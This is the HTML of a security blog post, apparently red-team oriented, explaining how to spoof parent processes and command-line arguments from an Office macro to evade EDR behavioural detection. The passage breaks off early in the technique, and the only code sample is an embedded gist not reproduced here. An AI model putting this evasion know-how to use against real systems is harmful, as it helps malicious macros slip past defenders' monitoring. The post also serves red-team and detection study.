@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+
+
+<html class="no-js" lang="en-US">
+<head itemscope="itemscope" itemtype="http://schema.org/WebSite">
+	
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="profile" href="http://gmpg.org/xfn/11">
+	<link rel="pingback" href="https://blog.christophetd.fr/xmlrpc.php">
+<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
+
+	<!-- This site is optimized with the Yoast SEO plugin v16.1.1 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Building an Office macro to spoof parent processes and command line arguments - Christophe Tafani-Dereeper</title>
+	<link rel="canonical" href="https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Building an Office macro to spoof parent processes and command line arguments - Christophe Tafani-Dereeper" />
+	<meta property="og:description" content="Most modern EDR solutions use behavioral detection, allowing to detect malware based on how it behaves instead of solely using static indicators of compromise (IoC) like file hashes or domain names. In this post, I give a VBA implementation of two techniques allowing to spoof both the parent process and the command line arguments of a newly created process. This implementation allows crafting stealthier Office macros, making a process spawned by a macro look like it has been created by another program such as explorer.exe and has benign-looking command line arguments. I am not the author of these techniques. CreditsContinue reading... Building an Office macro to spoof parent processes and command line arguments" />
+	<meta property="og:url" content="https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/" />
+	<meta property="og:site_name" content="Christophe Tafani-Dereeper" />
+	<meta property="article:published_time" content="2019-03-11T22:43:37+00:00" />
+	<meta property="article:modified_time" content="2020-12-20T12:24:04+00:00" />
+	<meta property="og:image" content="https://blog.christophetd.fr/wp-content/uploads/2019/03/maquereaux.png" />
+	<meta property="og:image:width" content="2126" />
+	<meta property="og:image:height" content="1182" />
+	<meta name="twitter:card" content="summary" />
+	<meta name="twitter:creator" content="@christophetd" />
+	<meta name="twitter:site" content="@christophetd" />
+	<meta name="twitter:label1" content="Written by">
+	<meta name="twitter:data1" content="christophetd">
+	<meta name="twitter:label2" content="Est. reading time">
+	<meta name="twitter:data2" content="7 minutes">
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://blog.christophetd.fr/#website","url":"https://blog.christophetd.fr/","name":"Christophe Tafani-Dereeper","description":"Personal tech and security blog about things I like, use, dislike and misuse.","potentialAction":[{"@type":"SearchAction","target":"https://blog.christophetd.fr/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/#primaryimage","inLanguage":"en-US","url":"https://blog.christophetd.fr/wp-content/uploads/2019/03/maquereaux.png","contentUrl":"https://blog.christophetd.fr/wp-content/uploads/2019/03/maquereaux.png","width":2126,"height":1182},{"@type":"WebPage","@id":"https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/#webpage","url":"https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/","name":"Building an Office macro to spoof parent processes and command line arguments - Christophe Tafani-Dereeper","isPartOf":{"@id":"https://blog.christophetd.fr/#website"},"primaryImageOfPage":{"@id":"https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/#primaryimage"},"datePublished":"2019-03-11T22:43:37+00:00","dateModified":"2020-12-20T12:24:04+00:00","author":{"@id":"https://blog.christophetd.fr/#/schema/person/e05816a0d86788d72dcc15aec9931ff2"},"breadcrumb":{"@id":"https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/"]}]},{"@type":"BreadcrumbList","@id":"https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"https://blog.christophetd.fr/","url":"https://blog.christophetd.fr/","name":"Home"}},{"@type":"ListItem","position":2,"item":{"@type":"WebPage","@id":"https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/","url":"https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/","name":"Building an Office macro to spoof parent processes and command line arguments"}}]},{"@type":"Person","@id":"https://blog.christophetd.fr/#/schema/person/e05816a0d86788d72dcc15aec9931ff2","name":"christophetd","image":{"@type":"ImageObject","@id":"https://blog.christophetd.fr/#personlogo","inLanguage":"en-US","url":"https://secure.gravatar.com/avatar/d70f8ef29f5f8ada0148e3bee7d78a8a?s=96&d=mm&r=g","contentUrl":"https://secure.gravatar.com/avatar/d70f8ef29f5f8ada0148e3bee7d78a8a?s=96&d=mm&r=g","caption":"christophetd"}}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link href='https://fonts.gstatic.com' crossorigin rel='preconnect' />
+<link rel="alternate" type="application/rss+xml" title="Christophe Tafani-Dereeper &raquo; Feed" href="https://blog.christophetd.fr/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Christophe Tafani-Dereeper &raquo; Comments Feed" href="https://blog.christophetd.fr/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Christophe Tafani-Dereeper &raquo; Building an Office macro to spoof parent processes and command line arguments Comments Feed" href="https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/feed/" />
+		<!-- This site uses the Google Analytics by MonsterInsights plugin v7.17.0 - Using Analytics tracking - https://www.monsterinsights.com/ -->
+							<script src="//www.googletagmanager.com/gtag/js?id=UA-104898392-1"  type="text/javascript" data-cfasync="false"></script>
+			<script type="text/javascript" data-cfasync="false">
+				var mi_version = '7.17.0';
+				var mi_track_user = true;
+				var mi_no_track_reason = '';
+				
+								var disableStr = 'ga-disable-UA-104898392-1';
+
+				/* Function to detect opted out users */
+				function __gtagTrackerIsOptedOut() {
+					return document.cookie.indexOf( disableStr + '=true' ) > - 1;
+				}
+
+				/* Disable tracking if the opt-out cookie exists. */
+				if ( __gtagTrackerIsOptedOut() ) {
+					window[disableStr] = true;
+				}
+
+				/* Opt-out function */
+				function __gtagTrackerOptout() {
+					document.cookie = disableStr + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
+					window[disableStr] = true;
+				}
+
+				if ( 'undefined' === typeof gaOptout ) {
+					function gaOptout() {
+						__gtagTrackerOptout();
+					}
+				}
+								window.dataLayer = window.dataLayer || [];
+				if ( mi_track_user ) {
+					function __gtagTracker() {dataLayer.push( arguments );}
+					__gtagTracker( 'js', new Date() );
+					__gtagTracker( 'set', {
+						'developer_id.dZGIzZG' : true,
+						                    });
+					__gtagTracker( 'config', 'UA-104898392-1', {
+						forceSSL:true,					} );
+										window.gtag = __gtagTracker;										(
+						function () {
+							/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
+							/* ga and __gaTracker compatibility shim. */
+							var noopfn = function () {
+								return null;
+							};
+							var newtracker = function () {
+								return new Tracker();
+							};
+							var Tracker = function () {
+								return null;
+							};
+							var p = Tracker.prototype;
+							p.get = noopfn;
+							p.set = noopfn;
+							p.send = function (){
+								var args = Array.prototype.slice.call(arguments);
+								args.unshift( 'send' );
+								__gaTracker.apply(null, args);
+							};
+							var __gaTracker = function () {
+								var len = arguments.length;
+								if ( len === 0 ) {
+									return;
+								}
+								var f = arguments[len - 1];
+								if ( typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function' ) {
+									if ( 'send' === arguments[0] ) {
+										var hitConverted, hitObject = false, action;
+										if ( 'event' === arguments[1] ) {
+											if ( 'undefined' !== typeof arguments[3] ) {
+												hitObject = {
+													'eventAction': arguments[3],
+													'eventCategory': arguments[2],
+													'eventLabel': arguments[4],
+													'value': arguments[5] ? arguments[5] : 1,
+												}
+											}
+										}
+										if ( typeof arguments[2] === 'object' ) {
+											hitObject = arguments[2];
+										}
+										if ( typeof arguments[5] === 'object' ) {
+											Object.assign( hitObject, arguments[5] );
+										}
+										if ( 'undefined' !== typeof (
+											arguments[1].hitType
+										) ) {
+											hitObject = arguments[1];
+										}
+										if ( hitObject ) {
+											action = 'timing' === arguments[1].hitType ? 'timing_complete' : hitObject.eventAction;
+											hitConverted = mapArgs( hitObject );
+											__gtagTracker( 'event', action, hitConverted );
+										}
+									}
+									return;
+								}
+
+								function mapArgs( args ) {
+									var gaKey, hit = {};
+									var gaMap = {
+										'eventCategory': 'event_category',
+										'eventAction': 'event_action',
+										'eventLabel': 'event_label',
+										'eventValue': 'event_value',
+										'nonInteraction': 'non_interaction',
+										'timingCategory': 'event_category',
+										'timingVar': 'name',
+										'timingValue': 'value',
+										'timingLabel': 'event_label',
+									};
+									for ( gaKey in gaMap ) {
+										if ( 'undefined' !== typeof args[gaKey] ) {
+											hit[gaMap[gaKey]] = args[gaKey];
+										}
+									}
+									return hit;
+								}
+
+								try {
+									f.hitCallback();
+								} catch ( ex ) {
+								}
+							};
+							__gaTracker.create = newtracker;
+							__gaTracker.getByName = newtracker;
+							__gaTracker.getAll = function () {
+								return [];
+							};
+							__gaTracker.remove = noopfn;
+							__gaTracker.loaded = true;
+							window['__gaTracker'] = __gaTracker;
+						}
+					)();
+									} else {
+										console.log( "" );
+					( function () {
+							function __gtagTracker() {
+								return null;
+							}
+							window['__gtagTracker'] = __gtagTracker;
+							window['gtag'] = __gtagTracker;
+					} )();
+									}
+			</script>
+				<!-- / Google Analytics by MonsterInsights -->
+				<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/blog.christophetd.fr\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.2"}};
+			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='https://blog.christophetd.fr/wp-includes/css/dist/block-library/style.min.css?ver=5.7.2' type='text/css' media='all' />
+<link rel='stylesheet' id='dashicons-css'  href='https://blog.christophetd.fr/wp-includes/css/dashicons.min.css?ver=5.7.2' type='text/css' media='all' />
+<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://blog.christophetd.fr/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.4' type='text/css' media='all' />
+<link rel='stylesheet' id='toc-screen-css'  href='https://blog.christophetd.fr/wp-content/plugins/table-of-contents-plus/screen.min.css?ver=2002' type='text/css' media='all' />
+<link rel='stylesheet' id='wp-ulike-css'  href='https://blog.christophetd.fr/wp-content/plugins/wp-ulike/assets/css/wp-ulike.min.css?ver=4.4.7' type='text/css' media='all' />
+<link rel='stylesheet' id='suri-style-css'  href='https://blog.christophetd.fr/wp-content/themes/suri/style.css?ver=5.7.2' type='text/css' media='all' />
+<style id='suri-style-inline-css' type='text/css'>
+.footer-widgets .widget+.widget{ border-color:#f2f2f2}
+</style>
+<link rel='stylesheet' id='suri-fonts-css'  href='https://fonts.googleapis.com/css?family=Roboto%3A400italic%2C700italic%2C400%2C700%7CNoto+Serif%3A700italic%2C700&#038;ver=5.7.2#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
+<link rel='stylesheet' id='suri-genericons-css'  href='https://blog.christophetd.fr/wp-content/themes/suri/resources/fonts/genericons/genbasic.css?ver=1.0.0' type='text/css' media='all' />
+<link rel='stylesheet' id='addtoany-css'  href='https://blog.christophetd.fr/wp-content/plugins/add-to-any/addtoany.min.css?ver=1.15' type='text/css' media='all' />
+<link rel='stylesheet' id='enlighterjs-css'  href='https://blog.christophetd.fr/wp-content/plugins/enlighter/cache/enlighterjs.min.css?ver=SQYoCdokVVWAbJ5' type='text/css' media='all' />
+<script type='text/javascript' id='monsterinsights-frontend-script-js-extra'>
+/* <![CDATA[ */
+var monsterinsights_frontend = {"js_events_tracking":"true","download_extensions":"doc,pdf,ppt,zip,xls,docx,pptx,xlsx","inbound_paths":"[]","home_url":"https:\/\/blog.christophetd.fr","hash_tracking":"false","ua":"UA-104898392-1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://blog.christophetd.fr/wp-content/plugins/google-analytics-for-wordpress/assets/js/frontend-gtag.min.js?ver=7.17.0' id='monsterinsights-frontend-script-js'></script>
+<script type='text/javascript' src='https://blog.christophetd.fr/wp-includes/js/jquery/jquery.min.js?ver=3.5.1' id='jquery-core-js'></script>
+<script type='text/javascript' src='https://blog.christophetd.fr/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
+<script type='text/javascript' src='https://blog.christophetd.fr/wp-content/plugins/add-to-any/addtoany.min.js?ver=1.1' id='addtoany-js'></script>
+<link rel="https://api.w.org/" href="https://blog.christophetd.fr/wp-json/" /><link rel="alternate" type="application/json" href="https://blog.christophetd.fr/wp-json/wp/v2/posts/759" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blog.christophetd.fr/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://blog.christophetd.fr/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 5.7.2" />
+<link rel='shortlink' href='https://blog.christophetd.fr/?p=759' />
+<link rel="alternate" type="application/json+oembed" href="https://blog.christophetd.fr/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblog.christophetd.fr%2Fbuilding-an-office-macro-to-spoof-process-parent-and-command-line%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://blog.christophetd.fr/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblog.christophetd.fr%2Fbuilding-an-office-macro-to-spoof-process-parent-and-command-line%2F&#038;format=xml" />
+
+<script data-cfasync="false">
+window.a2a_config=window.a2a_config||{};a2a_config.callbacks=[];a2a_config.overlays=[];a2a_config.templates={};
+(function(d,s,a,b){a=d.createElement(s);b=d.getElementsByTagName(s)[0];a.async=1;a.src="https://static.addtoany.com/menu/page.js";b.parentNode.insertBefore(a,b);})(document,"script");
+</script>
+<script type="text/javascript">
+(function(url){
+	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
+	var addEvent = function(evt, handler) {
+		if (window.addEventListener) {
+			document.addEventListener(evt, handler, false);
+		} else if (window.attachEvent) {
+			document.attachEvent('on' + evt, handler);
+		}
+	};
+	var removeEvent = function(evt, handler) {
+		if (window.removeEventListener) {
+			document.removeEventListener(evt, handler, false);
+		} else if (window.detachEvent) {
+			document.detachEvent('on' + evt, handler);
+		}
+	};
+	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
+	var logHuman = function() {
+		if (window.wfLogHumanRan) { return; }
+		window.wfLogHumanRan = true;
+		var wfscr = document.createElement('script');
+		wfscr.type = 'text/javascript';
+		wfscr.async = true;
+		wfscr.src = url + '&r=' + Math.random();
+		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
+		for (var i = 0; i < evts.length; i++) {
+			removeEvent(evts[i], logHuman);
+		}
+	};
+	for (var i = 0; i < evts.length; i++) {
+		addEvent(evts[i], logHuman);
+	}
+})('//blog.christophetd.fr/?wordfence_lh=1&hid=19F8C37756A5E00A9E64AD245BF47971');
+</script><!-- Analytics by WP-Statistics v13.0.8 - https://wp-statistics.com/ -->
+
+			<style type="text/css">
+				#wp-admin-bar-pvc-post-views .pvc-graph-container { padding-top: 6px; padding-bottom: 6px; position: relative; display: block; height: 100%; box-sizing: border-box; }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph {
+					display: inline-block;
+					width: 1px;
+					margin-right: 1px;
+					background-color: #ccc;
+					vertical-align: baseline;
+				}
+				#wp-admin-bar-pvc-post-views .pvc-line-graph:hover { background-color: #eee; }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-0 { height: 1% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-1 { height: 5% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-2 { height: 10% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-3 { height: 15% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-4 { height: 20% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-5 { height: 25% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-6 { height: 30% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-7 { height: 35% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-8 { height: 40% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-9 { height: 45% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-10 { height: 50% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-11 { height: 55% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-12 { height: 60% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-13 { height: 65% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-14 { height: 70% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-15 { height: 75% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-16 { height: 80% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-17 { height: 85% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-18 { height: 90% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-19 { height: 95% }
+				#wp-admin-bar-pvc-post-views .pvc-line-graph-20 { height: 100% }
+			</style>		<style type="text/css" id="wp-custom-css">
+			@media only screen and (min-width: 1000px) {
+
+.content-area {
+    width: 80% !important;
+    margin-right: 0 !important;
+}
+
+ .primary-sidebar {
+    position: relative;
+    width: 19% !important;
+    margin-right: 0 !important;
+    margin-left: 0 !important;
+}
+
+.site-content {
+    margin-right: 0 !important;
+    max-width: 2000px;
+}
+
+}		</style>
+		</head>
+
+<body itemscope="itemscope" itemtype="http://schema.org/WebPage" class="post-template-default single single-post postid-759 single-format-standard content-sidebar branding-wrapper">
+
+
+<div id="page" class="site">
+
+	
+	<header id="masthead" role="banner"  class="site-header" itemscope="itemscope" itemtype="http://schema.org/WPHeader">
+
+		
+<a class="skip-link screen-reader-text" href="#content">
+	Skip to content</a><!-- .skip-link -->
+
+					<div class="header-items">
+
+				
+<div class="site-branding">
+	
+<div class="title-area">
+
+			<p class="site-title" itemprop="headline">
+			<a href= "https://blog.christophetd.fr/" rel="home">Christophe Tafani-Dereeper</a>
+		</p>
+	
+			<p class="site-description" itemprop="description">
+			Personal tech and security blog about things I like, use, dislike and misuse.		</p>
+	
+</div><!-- .title-area -->
+</div><!-- .site-branding -->
+
+			</div><!-- .header-items -->
+		
+		<nav id="main-navigation" aria-label="Primary Menu" role="navigation" class="main-navigation" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
+	<h2 class="screen-reader-text">Main Navigation</h2>
+
+	<button aria-controls="primary-menu" aria-expanded="false" class="menu-toggle suri-gen-b sf-genericon genericon-menu-sf">
+		Menu	</button>
+
+	<div class="wrap"><ul id="primary-menu" class="nav-menu"><li id="menu-item-99" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-99"><a href="/" itemprop="url"><span itemprop="name">Home</span></a></li>
+<li id="menu-item-1189" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1189"><a href="https://blog.christophetd.fr/category/security/cloud-security/" itemprop="url"><span itemprop="name">Cloud Security</span></a></li>
+<li id="menu-item-1188" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-1188"><a href="https://blog.christophetd.fr/category/security/windows-security/" itemprop="url"><span itemprop="name">Windows Security</span></a></li>
+<li id="menu-item-1190" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-1190"><a href="https://blog.christophetd.fr/automating-the-provisioning-of-active-directory-labs-in-azure/" itemprop="url"><span itemprop="name">Active Directory Hunting Lab</span></a></li>
+<li id="menu-item-556" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-556"><a href="https://christophetd.fr" itemprop="url"><span itemprop="name">About me</span></a></li>
+</ul></div></nav><!-- #main-navigation -->
+
+	</header><!-- #masthead -->
+
+	
+	<div id="content" class="site-content">
+
+		
+	<div id="primary" class="content-area" itemprop="mainContentOfPage">
+
+		
+		<main id="main" role="main" class="site-main" itemscope="itemscope" itemtype="http://schema.org/Blog">
+
+			
+<article id="post-759" class="post-759 post type-post status-publish format-standard has-post-thumbnail hentry category-security category-windows-security tag-offensive tag-windows tag-windows-internals" itemscope="itemscope" itemtype="http://schema.org/CreativeWork">
+
+	
+	<header class="entry-header">
+
+		<h1 class="entry-title" itemprop="headline">Building an Office macro to spoof parent processes and command line arguments</h1>		
+		
+<div class="entry-meta">
+
+
+	<span class="posted-on suri-gen-b sf-genericon genericon-month-sf">
+		<a href="https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/" rel="bookmark">
+							<time datetime="2020-12-20T14:24:04+02:00" class="modified-entry-date" itemprop="dateModified">
+					20 December 2020				</time>
+				<time datetime="2019-03-12T00:43:37+02:00" class="entry-date" itemprop="datePublished">
+					12 March 2019				</time>
+					</a>
+	</span>
+
+		
+	</div>
+
+	</header><!-- .entry-header -->
+
+	
+	<div class="entry-content" itemprop="text">
+
+		<p>Most modern EDR solutions use behavioral detection, allowing to detect malware based on how it behaves instead of solely using static indicators of compromise (IoC) like file hashes or domain names. In this post, I give a VBA implementation of two techniques allowing to spoof both the parent process and the command line arguments of a newly created process. This implementation allows crafting stealthier Office macros, making a process spawned by a macro look like it has been created by another program such as <em>explorer.exe</em> and has benign-looking command line arguments.</p>
+<p>I am not the author of these techniques. Credits go to Will Burgess (<a href="https://www.youtube.com/watch?v=l8nkXCOYQC4"><em>Red Teaming in the EDR age</em></a>), <a href="https://didierstevens.com/">Didier Stevens</a>, and <a href="https://twitter.com/subtee">Casey Smith</a>.</p>
+<p><span id="more-759"></span></p>
+<div id="toc_container" class="no_bullets"><p class="toc_title">Table of Contents</p><ul class="toc_list"><li><a href="#Background"><span class="toc_number toc_depth_1">1</span> Background</a><ul><li><a href="#Process_parent_spoofing"><span class="toc_number toc_depth_2">1.1</span> Process parent spoofing</a></li><li><a href="#Process_command_line_spoofing"><span class="toc_number toc_depth_2">1.2</span> Process command line spoofing</a></li></ul></li><li><a href="#VBA_implementation"><span class="toc_number toc_depth_1">2</span> VBA implementation</a><ul><li><a href="#Goal"><span class="toc_number toc_depth_2">2.1</span> Goal</a></li><li><a href="#Result"><span class="toc_number toc_depth_2">2.2</span> Result</a></li></ul></li><li><a href="#Usage_in_the_wild"><span class="toc_number toc_depth_1">3</span> Usage in the wild</a></li><li><a href="#Detection"><span class="toc_number toc_depth_1">4</span> Detection</a></li><li><a href="#Anti-virus_detection"><span class="toc_number toc_depth_1">5</span> Anti-virus detection</a></li><li><a href="#Conclusion"><span class="toc_number toc_depth_1">6</span> Conclusion</a></li></ul></div>
+<h1><span id="Background">Background</span></h1>
+<p>First, a bit of background on the techniques we&#8217;ll implement in Visual Basic. I first heard about them in an awesome talk, <em><a href="https://www.youtube.com/watch?v=l8nkXCOYQC4">Red Teaming in the EDR age</a></em>, presented by Will Burgess at the Wild West Hackin&#8217; Fest 2018.</p>
+<h2><span id="Process_parent_spoofing">Process parent spoofing</span></h2>
+<p>When a process spawns a child process, EDR solutions such as Sysmon log the action and record various information such as the newly created process name, hash, executable path, as well as information about the parent process. This is very handy to build behavioral rules such as &#8220;<em>Microsoft Word should never spawn powershell.exe&#8221;</em>. These are rules that, in my experience, are of low complexity, high added value, and generate a low amount of false positives.</p>
+<figure id="attachment_762" aria-describedby="caption-attachment-762" style="width: 840px" class="wp-caption aligncenter"><a href="https://blog.christophetd.fr/wp-content/uploads/2019/03/sysmon.png"><img loading="lazy" class="wp-image-762 size-full" src="https://blog.christophetd.fr/wp-content/uploads/2019/03/sysmon.png" alt="" width="840" height="439" srcset="https://blog.christophetd.fr/wp-content/uploads/2019/03/sysmon.png 840w, https://blog.christophetd.fr/wp-content/uploads/2019/03/sysmon-300x157.png 300w, https://blog.christophetd.fr/wp-content/uploads/2019/03/sysmon-768x401.png 768w" sizes="(max-width: 840px) 100vw, 840px" /></a><figcaption id="caption-attachment-762" class="wp-caption-text">Example of a powershell process being spawned by Microsoft Word. This does not look legitimate at all.</figcaption></figure>
+<p>It turns out that when creating a process using the Windows native API, you can specify any arbitrary process to be used as a parent process. This is nothing new and I won&#8217;t describe in more depth. Actually, Didier Stevens <a href="https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/">blogged</a> about this 10 years ago! Here&#8217;s for reference a sample piece of C++ code which will spawn <em>cmd.exe</em> with an arbitrary process as a parent.</p>
+<p><script src="https://gist.github.com/christophetd/0c44fd5e16e352ad924f98620094cd8d.js"></script></p>
+<figure id="attachment_764" aria-describedby="caption-attachment-764" style="width: 837px" class="wp-caption aligncenter"><a href="https://blog.christophetd.fr/wp-content/uploads/2019/03/sysmon-calc.png"><img loading="lazy" class="wp-image-764 size-full" src="https://blog.christophetd.fr/wp-content/uploads/2019/03/sysmon-calc.png" alt="" width="837" height="406" srcset="https://blog.christophetd.fr/wp-content/uploads/2019/03/sysmon-calc.png 837w, https://blog.christophetd.fr/wp-content/uploads/2019/03/sysmon-calc-300x146.png 300w, https://blog.christophetd.fr/wp-content/uploads/2019/03/sysmon-calc-768x373.png 768w" sizes="(max-width: 837px) 100vw, 837px" /></a><figcaption id="caption-attachment-764" class="wp-caption-text">The calc.exe process appears like it has been spawned by notepad.exe</figcaption></figure>
+<h2><span id="Process_command_line_spoofing">Process command line spoofing</span></h2>
+<p>This is a newer technique which, as far as I know, was first described by Casey Smith on Twitter (<a href="https://twitter.com/subtee">@subtee</a>), as Will Burgess says in his talk. Adam Chester then wrote a proof-of-concept C++ code <a href="https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/">on his blog</a>. I encourage you to go and read his article to understand the details of the implementation. But let&#8217;s take a quick look at how this technique works.</p>
+<p>When a process is created, an internal Windows data structure, the Process Environment Block, is mapped inside the process virtual memory. This data structure contains <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winternl/ns-winternl-_peb">a bunch of information</a> about the process itself such as the list of loaded modules and the command line used to start the process. Since the PEB (and therefore the command line) is stored in the memory space of the process and not in kernel space, it is quite easy to overwrite it provided we have the appropriate rights on the process.</p>
+<figure id="attachment_767" aria-describedby="caption-attachment-767" style="width: 457px" class="wp-caption aligncenter"><a href="https://blog.christophetd.fr/wp-content/uploads/2019/03/PH-mapped-PEB.png"><img loading="lazy" class="wp-image-767 size-full" src="https://blog.christophetd.fr/wp-content/uploads/2019/03/PH-mapped-PEB.png" alt="" width="457" height="514" srcset="https://blog.christophetd.fr/wp-content/uploads/2019/03/PH-mapped-PEB.png 457w, https://blog.christophetd.fr/wp-content/uploads/2019/03/PH-mapped-PEB-267x300.png 267w" sizes="(max-width: 457px) 100vw, 457px" /></a><figcaption id="caption-attachment-767" class="wp-caption-text">The PEB inside notepad.exe&#8217;s virtual memory space. The region is marked as RW, so we can write to it.</figcaption></figure>
+<p>More specifically, the technique works as follows:</p>
+<ol>
+<li>Create the process in a suspended state</li>
